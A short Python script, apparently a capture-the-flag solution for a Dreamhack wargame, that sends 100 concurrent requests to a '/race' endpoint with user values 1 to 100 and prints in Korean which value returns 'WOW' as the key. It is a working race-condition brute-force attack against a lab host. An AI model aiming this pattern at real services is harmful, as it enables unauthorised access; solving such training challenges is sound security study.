import requests, tqdm, aiohttp, asyncio

url = "http://host3.dreamhack.games:22341/"

async def fetch(url, i):
    async with aiohttp.ClientSession() as session:
        async with session.get(url + "/race", params={'user' : i}) as response:
            result = await response.text()
            if result == "WOW":
                print(i, "가 KEY 입니다." )
                
                
async def main():
    tasks = []
    for i in range(1, 101):
        task = asyncio.create_task(fetch(url, i))
        tasks.append(task)
        
    result = await asyncio.gather(*tasks)
    return result

if __name__ == "__main__":
    asyncio.run(main())